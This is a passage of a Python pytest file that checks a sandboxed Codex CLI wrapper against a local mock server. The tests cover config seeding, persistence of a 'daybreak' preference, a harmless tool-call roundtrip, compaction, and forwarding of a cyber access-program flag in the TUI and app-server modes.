    seed = host_settings(host, worktree)
    if with_profile:
        write_host_mcp(
            SessionMCP(document={"mcp_servers": {}}, commands=(), kind="toml"),
            box_file,
            seed,
        )
    else:
        seed_settings(state, seed)
    credential = _auth(tmp_path / "host" / "auth.json")
    backend = CodexBackend(
        upstream=upstream_url, credentials=credential, codex_home=state
    )
    base = codex(worktree, state=state, egress=(backend,))
    spec = dataclasses.replace(
        base, limits=dataclasses.replace(base.limits, use_cgroup=False)
    )
    profile = ("--profile", "aisan-host-mcp") if with_profile else ()
    try:
        result = await _exec_in_box(
            spec,
            (*profile, "exec", "--skip-git-repo-check", "say hi"),
            backend.config_overrides(),
            "codex-host-seed",
        )
    finally:
        await runner.cleanup()

    assert result.returncode != 0
    assert seen, result.stderr
    assert {body["model"] for body in seen} == {"host-chosen-model"}
    assert {body["reasoning"]["effort"] for body in seen} == {"low"}


@pytest.mark.parametrize("value", [True, False, "true", 1, [], {}])
@pytest.mark.parametrize("with_profile", [True, False])
def test_daybreak_preference_import_and_persistence(tmp_path, value, with_profile):
    from aisan.cli.codex import host_settings, seed_settings, write_host_mcp
    from aisan.session_mcp import SessionMCP, write_toml_document

    host = tmp_path / "host.toml"
    write_toml_document(host, {"daybreak": value, "unrelated": True})
    seed = host_settings(host, Path("/repo"))
    assert seed == ({"daybreak": value} if isinstance(value, bool) else {})
    state = tmp_path / "state"
    state.mkdir()
    config = state / ("profile.config.toml" if with_profile else "config.toml")
    config.write_text('model = "saved-model"\ndaybreak = true\n')
    if with_profile:
        mcp = SessionMCP(document={"mcp_servers": {}}, commands=(), kind="toml")
        write_host_mcp(mcp, config, seed)
        write_host_mcp(mcp, config)
    else:
        seed_settings(state, seed)
    saved = tomllib.loads(config.read_text())
    assert saved["daybreak"] is (value if isinstance(value, bool) else True)
    assert saved["model"] == "saved-model"


def _daybreak_catalog():
    return json.loads(
        (Path(__file__).parent / "fixtures" / "codex-daybreak-models.json").read_text()
    )


def _response_events(item, response_id):
    events = [
        {"type": "response.output_item.done", "item": item},
        {
            "type": "response.completed",
            "response": {
                "id": response_id,
                "usage": {"input_tokens": 10, "output_tokens": 10, "total_tokens": 20},
            },
        },
    ]
    return web.Response(
        text="".join(
            f"event: {event['type']}\ndata: {json.dumps(event)}\n\n" for event in events
        ),
        content_type="text/event-stream",
    )


@pytest.mark.live
@pytest.mark.skipif(codex_binary() is None, reason="codex is not installed")
@pytest.mark.parametrize("shared", [False, True])
async def test_daybreak_tool_roundtrip_and_compaction_in_box(
    tmp_path, shared, monkeypatch
):
    import aisan.egress.openai_responses as codex_egress

    seen = []
    proxy_requests = []
    make_proxy = codex_egress.make_app

    @web.middleware
    async def observe(request, handler):
        response = await handler(request)
        proxy_requests.append(
            (
                request.method,
                request.path,
                request.headers.get("Authorization"),
                response.status,
            )
        )
        return response

    def observed_proxy(**kwargs):
        app = make_proxy(**kwargs)
        app.middlewares.append(observe)
        return app

    monkeypatch.setattr(codex_egress, "make_app", observed_proxy)

    async def upstream(request):
        if request.path.endswith("/models"):
            return web.json_response(_daybreak_catalog())
        if request.method != "POST":
            return web.json_response({})
        assert "Content-Encoding" not in request.headers
        assert request.headers["Authorization"] == f"Bearer {_jwt(4_102_444_800)}"
        assert request.headers["ChatGPT-Account-Id"] == FAKE_ACCOUNT
        body = await request.json()
        seen.append(body)
        if {"type": "compaction_trigger"} in body["input"]:
            return _response_events(
                {
                    "type": "compaction",
                    "encrypted_content": "synthetic-compaction-summary",
                },
                "compact-1",
            )
        if len(seen) == 1:
            return _response_events(
                {
                    "type": "function_call",
                    "call_id": "test-call",
                    "name": "exec_command",
                    "arguments": json.dumps(
                        {"cmd": "printf aisan-daybreak-tool-marker"}
                    ),
                },
                "tool-1",
            )
        return _response_events(
            {
                "type": "message",
                "id": "message-1",
                "role": "assistant",
                "content": [{"type": "output_text", "text": "aisan-daybreak-answer"}],
            },
            "response-1",
        )

    upstream_url, runner = await _upstream_server(upstream)
    worktree = tmp_path / "worktree"
    worktree.mkdir()
    state = tmp_path / "state"
    state.mkdir()
    (state / "config.toml").write_text(
        'openai_base_url = "http://127.0.0.1:1"\n'
        'chatgpt_base_url = "http://127.0.0.1:1"\n'
        "[features]\nenable_request_compression = true\n"
    )
    backend = _backend(tmp_path, upstream=upstream_url, codex_home=state)
    base = codex(worktree, state=state, egress=(backend,), unshare_net=not shared)
    spec = dataclasses.replace(
        base, limits=dataclasses.replace(base.limits, use_cgroup=False)
    )
    try:
        async with Box(spec, box_id="codex-daybreak") as box:
            process = await asyncio.create_subprocess_exec(
                *box.command(
                    codex_argv(
                        ("app-server", "--stdio"),
                        overrides=backend.config_overrides(
                            port=box.activation(backend).port
                        ),
                    )
                ),
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env={**os.environ, **box.env},
            )

            async def read_message():
                line = await asyncio.wait_for(process.stdout.readline(), 30)
                assert line, (await process.stderr.read()).decode()
                return json.loads(line)

            async def rpc(request_id, method, params):
                process.stdin.write(
                    (
                        json.dumps(
                            {"id": request_id, "method": method, "params": params}
                        )
                        + "\n"
                    ).encode()
                )
                await process.stdin.drain()
                while True:
                    message = await read_message()
                    if message.get("id") == request_id:
                        assert "error" not in message, message
                        return message["result"]

            async def completed():
                while True:
                    message = await read_message()
                    if message.get("method") == "turn/completed":
                        assert message["params"]["turn"]["status"] == "completed", (
                            message
                        )
                        return

            try:
                await rpc(
                    0,
                    "initialize",
                    {
                        "clientInfo": {"name": "aisan-test", "version": "1"},
                        "capabilities": {"experimentalApi": True},
                    },
                )
                models = await rpc(1, "model/list", {"includeHidden": True})
                assert any(
                    m["displayName"] == "Aisan Daybreak Test" for m in models["data"]
                )
                thread = await rpc(
                    2,
                    "thread/start",
                    {
                        "model": "gpt-6-sol",
                        "cwd": str(worktree),
                        "approvalPolicy": "never",
                        "sandbox": "danger-full-access",
                    },
                )
                thread_id = thread["thread"]["id"]
                await rpc(
                    3,
                    "turn/start",
                    {
                        "threadId": thread_id,
                        "input": [{"type": "text", "text": "Run the test tool."}],
                        "cyberAccessProgram": "daybreakBlue",
                    },
                )
                await completed()
                assert len(seen) == 2
                outputs = [
                    item
                    for item in seen[1]["input"]
                    if item["type"] == "function_call_output"
                ]
                assert len(outputs) == 1
                assert "aisan-daybreak-tool-marker" in outputs[0]["output"], seen[0][
                    "tools"
                ]
                assert all(
                    body["access_programs"] == {"cyber": "daybreak_blue"}
                    for body in seen
                )
                await rpc(4, "thread/compact/start", {"threadId": thread_id})
                await completed()
                assert {"type": "compaction_trigger"} in seen[-1]["input"]
                await rpc(
                    5,
                    "turn/start",
                    {
                        "threadId": thread_id,
                        "input": [{"type": "text", "text": "Continue."}],
                        "cyberAccessProgram": "daybreakBlue",
                    },
                )
                await completed()
                assert any(
                    item.get("encrypted_content") == "synthetic-compaction-summary"
                    for item in seen[-1]["input"]
                )
                bearer = f"Bearer {box.activation(backend).client_env[CLIENT_KEY_ENV]}"
                assert {auth for _, _, auth, _ in proxy_requests} == {bearer}
                upgrades = [
                    status
                    for method, path, _, status in proxy_requests
                    if (method, path) == ("GET", "/responses")
                ]
                assert upgrades == [426]

            finally:
                process.terminate()
                await asyncio.wait_for(process.wait(), 5)
    finally:
        await runner.cleanup()


@pytest.mark.live
@pytest.mark.skipif(codex_binary() is None, reason="codex is not installed")
async def test_daybreak_tui_picker_and_blue_selection(tmp_path):
    import shlex

    seen = []

    async def upstream(request):
        if request.path.endswith("/models"):
            return web.json_response(_daybreak_catalog())
        if request.path.endswith("/accounts/check"):
            return web.json_response(
                {
                    "accounts": [
                        {
                            "id": FAKE_ACCOUNT,
                            "workspace_backend_origin": "NO_CONSTRAINT",
                            "account_routing_override": "NO_CONSTRAINT",
                        }
                    ],
                    "default_account_id": FAKE_ACCOUNT,
                }
            )
        if request.method == "POST":
            seen.append(await request.json())
            return _response_events(
                {
                    "type": "message",
                    "id": "tui-message",
                    "role": "assistant",
                    "content": [{"type": "output_text", "text": "aisan-tui-answer"}],
                },
                "tui-response",
            )
        return web.json_response({"plan_type": "pro"})

    upstream_url, runner = await _upstream_server(upstream)
    worktree = tmp_path / "worktree"
    worktree.mkdir()
    state = tmp_path / "state"
    state.mkdir()
    (state / "config.toml").write_text(
        'model = "gpt-6-sol"\ndaybreak = false\n'
        f'[projects.{json.dumps(str(worktree))}]\ntrust_level = "trusted"\n'
    )
    backend = _backend(tmp_path, upstream=upstream_url, codex_home=state)
    base = codex(worktree, state=state, egress=(backend,))
    spec = dataclasses.replace(
        base, limits=dataclasses.replace(base.limits, use_cgroup=False)
    )
    try:
        async with Box(spec, box_id="codex-daybreak-tui") as box:
            command = shlex.join(
                box.command(
                    codex_argv(
                        ("--no-alt-screen",), overrides=backend.config_overrides()
                    )
                )
            )
            process = await asyncio.create_subprocess_exec(
                "script",
                "-qefc",
                "stty rows 40 cols 120; exec " + command,
                "/dev/null",
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
                env={
                    **os.environ,
                    **box.env,
                    "TERM": "xterm-256color",
                    "COLUMNS": "120",
                    "LINES": "40",
                },
            )
            output = bytearray()

            async def expect(text):
                try:
                    async with asyncio.timeout(10):
                        while text.encode() not in output:
                            chunk = await process.stdout.read(65536)
                            assert chunk, output.decode(errors="replace")
                            output.extend(chunk)
                            if b"\x1b[6n" in chunk:
                                process.stdin.write(b"\x1b[1;1R")
                                await process.stdin.drain()
                except TimeoutError:
                    pytest.fail(
                        f"TUI did not display {text!r}: {output.decode(errors='replace')!r}"
                    )

            async def send(text):
                output.clear()
                process.stdin.write(text.encode())
                await process.stdin.drain()

            try:
                await expect("Aisan Daybreak Test")
                await expect("Tip:")
                await send("/daybreak")
                await expect("/daybreak")
                await send("\r")
                await expect("Applies to new turns.")
                await send("Run the test.")
                await expect("Run the test.")
                await send("\r")
                await expect("aisan-tui-answer")
                assert seen
                assert seen[-1]["access_programs"] == {"cyber": "daybreak_blue"}
                await send("/model")
                await expect("/model")
                await send("\r")
                await expect("Select Model and Effort")
                await expect("Synthetic entitled model")
                assert (
                    tomllib.loads((state / "config.toml").read_text())["daybreak"]
                    is True
                )
            finally:
                process.stdin.write(b"\x03\x03")
                await process.stdin.drain()
                try:
                    await asyncio.wait_for(process.wait(), 5)
                except TimeoutError:
                    process.terminate()
                    await process.wait()
    finally:
        await runner.cleanup()
